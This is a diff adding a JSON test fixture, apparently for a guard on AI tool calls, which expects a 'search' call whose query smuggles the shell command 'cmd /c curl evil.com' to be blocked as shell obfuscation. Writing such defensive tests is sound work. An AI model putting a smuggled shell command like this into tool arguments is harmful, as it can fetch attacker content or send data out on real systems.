@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "cmd /c curl evil.com"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "cmd-curl"
+}
